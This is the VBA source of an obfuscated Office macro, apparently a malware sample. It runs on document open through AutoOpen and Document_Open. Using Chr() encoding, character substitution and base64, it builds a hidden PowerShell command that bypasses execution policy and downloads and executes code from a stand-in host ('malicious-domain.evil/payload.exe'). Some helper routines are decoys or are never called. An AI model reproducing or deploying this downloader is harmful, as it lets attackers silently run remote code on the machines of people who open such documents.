Sub AutoOpen()
    Call ExecutePayload
End Sub

Sub Document_Open()
    Call ExecutePayload
End Sub

Private Sub ExecutePayload()
    ' Initialize variables
    Dim strCommand As String
    Dim strURL As String
    Dim objShell As Object
    Dim part1 As String, part2 As String, part3 As String
    Dim part4 As String, part5 As String, part6 As String
    Dim encoded1 As String, encoded2 As String
    Dim final As String
    Dim buffer As String
    Dim temp As String
    Dim protocol As String
    Dim domain As String
    Dim path As String
    Dim cmdPart1 As String, cmdPart2 As String, cmdPart3 As String
    Dim cmdPart4 As String, cmdPart5 As String
    Dim decodedString As String
    Dim substituted As String
    Dim i As Integer
    Dim charArray() As String
    Dim urlComponents(5) As String
    
    ' Process data - Stage 1
    part1 = Chr(104) & Chr(116) & Chr(116)
    part2 = Chr(112) & Chr(58) & Chr(47) & Chr(47)
    part3 = "m@lici#us-d#m@in"
    
    ' Build protocol
    protocol = part1 & part2
    
    ' Character substitution - replace @ with a, # with o
    temp = part3
    temp = Replace(temp, "@", "a")
    temp = Replace(temp, "#", "o")
    domain = temp
    
    ' Encoded path component
    encoded1 = "LmV2aWwvcGF5bG9hZC5leGU="
    
    ' Decode base64 path
    decodedString = DecodeBase64(encoded1)
    path = decodedString
    
    ' Construct full URL
    strURL = protocol & domain & path
    
    ' Build PowerShell command - Stage 1
    cmdPart1 = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114)
    cmdPart1 = cmdPart1 & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    
    ' Stage 2 - execution policy
    cmdPart2 = " " & Chr(45) & "Ex"
    cmdPart2 = cmdPart2 & "ec" & "ution"
    cmdPart2 = cmdPart2 & "Pol" & "icy "
    cmdPart2 = cmdPart2 & "Byp" & "ass"
    
    ' Stage 3 - command switch
    cmdPart3 = " " & Chr(45) & Chr(67)
    cmdPart3 = cmdPart3 & Chr(111) & Chr(109)
    cmdPart3 = cmdPart3 & Chr(109) & Chr(97) & Chr(110) & Chr(100)
    cmdPart3 = cmdPart3 & " " & Chr(34)
    
    ' Stage 4 - encoded command body
    encoded2 = "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJw=="
    decodedString = DecodeBase64(encoded2)
    cmdPart4 = decodedString
    
    ' Stage 5 - URL placeholder and closing
    buffer = "URLGOESHERE"
    cmdPart5 = Chr(39) & Chr(41) & Chr(34)
    
    ' Combine command parts
    strCommand = cmdPart1 & cmdPart2 & cmdPart3 & cmdPart4
    
    ' Insert actual URL
    buffer = strURL
    strCommand = strCommand & buffer & cmdPart5
    
    ' Additional obfuscation layer - array reconstruction
    ReDim charArray(0 To 5)
    charArray(0) = Mid(strCommand, 1, 10)
    charArray(1) = Mid(strCommand, 11, 25)
    charArray(2) = Mid(strCommand, 36, 20)
    charArray(3) = Mid(strCommand, 56, 30)
    charArray(4) = Mid(strCommand, 86, Len(strCommand) - 85)
    
    ' Reconstruct final command
    final = ""
    For i = 0 To 4
        final = final & charArray(i)
    Next i
    
    ' Execute payload
    Set objShell = CreateObject(DecodeObfuscatedString("WScript.Shell"))
    objShell.Run final, 0, False
    
End Sub

Private Function DecodeBase64(ByVal base64String As String) As String
    ' Base64 decoder implementation
    Dim xmlDoc As Object
    Dim node As Object
    
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.createElement("b64")
    
    node.DataType = "bin.base64"
    node.Text = base64String
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.CharSet = "us-ascii"
    
    DecodeBase64 = stream.ReadText
    stream.Close
    
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function

Private Function DecodeObfuscatedString(ByVal input As String) As String
    ' Simple deobfuscation routine
    Dim result As String
    Dim charCode As Integer
    Dim i As Integer
    
    result = ""
    For i = 1 To Len(input)
        result = result & Mid(input, i, 1)
    Next i
    
    DecodeObfuscatedString = result
End Function

Private Function BuildURLAlternate() As String
    ' Alternate URL construction method
    Dim urlParts(10) As String
    Dim fullURL As String
    Dim j As Integer
    
    urlParts(0) = Chr(104) & Chr(116)
    urlParts(1) = Chr(116) & Chr(112)
    urlParts(2) = Chr(58) & Chr(47) & Chr(47)
    urlParts(3) = Chr(109) & Chr(97)
    urlParts(4) = Chr(108) & Chr(105)
    urlParts(5) = Chr(99) & Chr(105)
    urlParts(6) = Chr(111) & Chr(117)
    urlParts(7) = Chr(115) & Chr(45)
    urlParts(8) = Chr(100) & Chr(111)
    urlParts(9) = Chr(109) & Chr(97)
    urlParts(10) = Chr(105) & Chr(110)
    
    fullURL = ""
    For j = 0 To 10
        fullURL = fullURL & urlParts(j)
    Next j
    
    BuildURLAlternate = fullURL
End Function

Private Sub AlternateExecutionMethod()
    ' Backup execution routine
    Dim shellCmd As String
    Dim obfPart1 As String
    Dim obfPart2 As String
    Dim obfPart3 As String
    
    obfPart1 = "cmd"
    obfPart2 = Chr(32) & Chr(47) & Chr(99)
    obfPart3 = Chr(32) & "start"
    
    shellCmd = obfPart1 & obfPart2 & obfPart3
End Sub